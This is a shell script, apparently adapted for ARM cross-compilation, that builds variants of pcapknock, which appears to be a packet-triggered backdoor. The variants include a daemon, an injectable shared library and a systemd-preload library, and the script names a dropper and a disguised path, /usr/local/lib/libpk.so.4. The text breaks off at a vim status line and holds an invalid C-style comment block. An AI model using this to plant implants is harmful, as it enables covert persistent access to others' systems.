#!/bin/sh
#
# build.sh
# Build pcapknock for a variety of situations
# By J. Stuart McMurray
# Created 20190324
# Last Modified 20190326
/* YOU SHOULD recompile libpcap/ with aarch toolchains

export CC=aarch64-linux-gnu-gcc
export AR=aarch64-linux-gnu-ar
export RANLIB=aarch64-linux-gnu-ranlib
# 配置和编译 libpcap
./configure --host=aarch64-linux-gnu --prefix=$(pwd)/../libpcap-arm
make 
make clean
*/

set -e

# Options to pass to the C compiler
COPTS="-Os -Wall --pedantic -static "
OUTDIR="./built/$(uname -s)_arm"

# Make sure we're in the same directory as the sources
if [ ! -r pcapknock.c ]; then
        echo "Source file pcapknock.c not found.  Sure you're in the right place?" >&2
        exit 1
fi

# Make sure we have an output directory
if [ ! -d "$OUTDIR" ]; then mkdir -p $OUTDIR; fi

# Cross compilation toolchain prefix
TOOLCHAIN_PREFIX=aarch64-linux-gnu-

# Linux
if [ "Linux" = "$(uname -s)" ]; then
        PCAPDIR=./libpcap-1.9.0 #Vendored libpcap
        INJDIR=./linux_injector
        DROPPER=$OUTDIR/systemd_dropper.sh
        DROPPERLIB="/usr/local/lib/libpk.so.4"

        # Build a standalone binary for debugging
        ${TOOLCHAIN_PREFIX}gcc $COPTS -DDEBUG                         -I$PCAPDIR -o "$OUTDIR/pcapknock.standalone.debug"  *.c $PCAPDIR/libpcap.a -lpthread
        # Build a standalone non-daemonizing binary
        ${TOOLCHAIN_PREFIX}gcc $COPTS                                 -I$PCAPDIR -o "$OUTDIR/pcapknock.standalone"        *.c $PCAPDIR/libpcap.a -lpthread
        # Build a standalone daemonizing binary
        ${TOOLCHAIN_PREFIX}gcc $COPTS -DDAEMON                        -I$PCAPDIR -o "$OUTDIR/pcapknock.standalone.daemon" *.c $PCAPDIR/libpcap.a -lpthread
        # Build an injectable library
        ${TOOLCHAIN_PREFIX}gcc $COPTS -DCONSTRUCTOR                   -I$PCAPDIR -o "$OUTDIR/pcapknock.so"                *.c $PCAPDIR/libpcap.a -lpthread -fPIC -shared -fvisibility=hidden
        # Build an preloadable systemd-only library
        ${TOOLCHAIN_PREFIX}gcc $COPTS -DCONSTRUCTOR -DPRELOAD_SYSTEMD -I$PCAPDIR -o "$OUTDIR/pcapknock.systemd.so"        *.c $PCAPDIR/libpcap.a -lpthread -ldl -fPIC -shared -Wl,--version-script=systemd.version
"build-arm.sh" 76L, 4120B                                                                                                        12,36         Top
